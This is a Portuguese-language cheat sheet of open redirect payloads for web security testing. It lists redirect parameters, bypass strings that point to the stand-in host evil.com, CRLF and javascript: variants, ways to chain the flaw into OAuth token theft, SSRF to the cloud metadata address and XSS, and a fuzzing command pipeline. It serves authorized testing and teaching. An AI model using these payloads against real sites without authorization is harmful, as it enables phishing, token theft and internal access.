# 🔀 Guia de referência de redirecionamentos abertos

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

> **Nota de contexto:** os payloads dependem da forma como o servidor e o navegador interpretam o URL; uma variante não funciona necessariamente em todos os destinos. Um redirecionamento aberto não implica automaticamente XSS ou roubo de tokens OAuth. É preciso demonstrar a cadeia e o impacto; no OAuth, a validação rigorosa dos URIs de redirecionamento é determinante. [RFC 9700](https://www.rfc-editor.org/rfc/rfc9700.html#section-4.11) e [descrição da PortSwigger](https://portswigger.net/kb/issues/00500100_open-redirection-reflected). *Phishing* é a tentativa de enganar o utilizador para obter dados ou ações através de uma aparência de confiança.

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
   ██████╗ ██████╗ ███████╗███╗   ██╗    ██████╗ ███████╗██████╗ ██╗██████╗ ███████╗ ██████╗████████╗
  ██╔═══██╗██╔══██╗██╔════╝████╗  ██║    ██╔══██╗██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝
  ██║   ██║██████╔╝█████╗  ██╔██╗ ██║    ██████╔╝█████╗  ██║  ██║██║██████╔╝█████╗  ██║        ██║   
  ██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║    ██╔══██╗██╔══╝  ██║  ██║██║██╔══██╗██╔══╝  ██║        ██║   
  ╚██████╔╝██║     ███████╗██║ ╚████║    ██║  ██║███████╗██████╔╝██║██║  ██║███████╗╚██████╗   ██║   
   ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝    ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═╝   
```

---

## 🎯 O que é um redirecionamento aberto

Um **redirecionamento aberto** permite que atacantes encaminhem utilizadores para sites maliciosos através de domínios de confiança, facilitando o phishing e o encadeamento com outras vulnerabilidades.

---

## 🔍 Parâmetros comuns

```
url=
redirect=
redirect_uri=
redirect_url=
next=
next_url=
return=
return_url=
rurl=
dest=
destination=
redir=
redirect_uri=
return_to=
checkout_url=
continue=
image_url=
go=
view=
to=
out=
ref=
callback=
```

---

## 💉 Payloads

### Básico
```
https://target.com/redirect?url=https://evil.com
https://target.com/redirect?url=http://evil.com
https://target.com/redirect?url=//evil.com
```

### Sem protocolo explícito
```
//evil.com
///evil.com
////evil.com
/\/evil.com
```

### Utilizar o símbolo @
```
https://target.com@evil.com
https://target.com%40evil.com
//target.com@evil.com
```

### Técnicas com barras invertidas
```
https://evil.com\@target.com
//evil.com\@target.com
https://target.com/redirect?url=https://evil.com\.target.com
```

### Codificação de URLs
```
https://evil.com
https:%2f%2fevil.com
https:%252f%252fevil.com
%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
```

### Confusão de domínios
```
https://evil.com?.target.com
https://evil.com#.target.com
https://evil.com\.target.com
https://target.com.evil.com
https://targetcom.evil.com
```

### Bytes nulos
```
https://evil.com%00.target.com
https://evil.com%00@target.com
```

### Injeção de CRLF
```
https://target.com/redirect?url=%0d%0aLocation:%20https://evil.com
```

### Redirecionamento JavaScript
```
javascript:alert(1)
javascript://target.com/%0d%0aalert(1)
data:text/html,<script>location='https://evil.com'</script>
```

---

## 🛡️ Técnicas de contorno

### Quando é verificada uma lista de permissões
```
# Contorno através de subdomínios
https://target.com.evil.com
https://evil.target.com
https://targetcom.evil.com

# Contorno através do caminho
https://target.com/https://evil.com
https://target.com//evil.com
```

### Quando apenas HTTPS é permitido
```
https://evil.com
https://evil.com%2f%2ftarget.com
```

### Técnicas com localhost
```
http://localhost
http://127.0.0.1
http://[::1]
```

---

## 🔗 Encadear redirecionamentos abertos

### Roubo de tokens OAuth
```
https://target.com/oauth?redirect_uri=https://evil.com
→ Roubar tokens OAuth
```

### Encadeamento com SSRF
```
https://target.com/redirect?url=http://169.254.169.254/
```

### Encadeamento com XSS
```
https://target.com/redirect?url=javascript:alert(document.domain)
```

---

## 📊 Referência rápida

| Tipo de payload | Exemplo |
|--------------|---------|
| Básico | `//evil.com` |
| Símbolo @ | `https://target.com@evil.com` |
| Codificação | `https:%2f%2fevil.com` |
| Confusão de domínios | `https://target.com.evil.com` |
| JavaScript | `javascript:alert(1)` |

---

## 🛠️ Ferramentas

```bash
# Padrões do GF
gau target.com | gf redirect

# Testes manuais
echo "https://target.com/r?url=FUZZ" | \
  qsreplace "https://evil.com" | \
  httpx -silent -location
```

---

## 📚 Recursos

- [PortSwigger — redirecionamentos abertos](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)

---

<p align="center">
  <b>🔀 Explore redirecionamentos!</b><br>
  <i>Apenas para testes autorizados!</i>
</p>
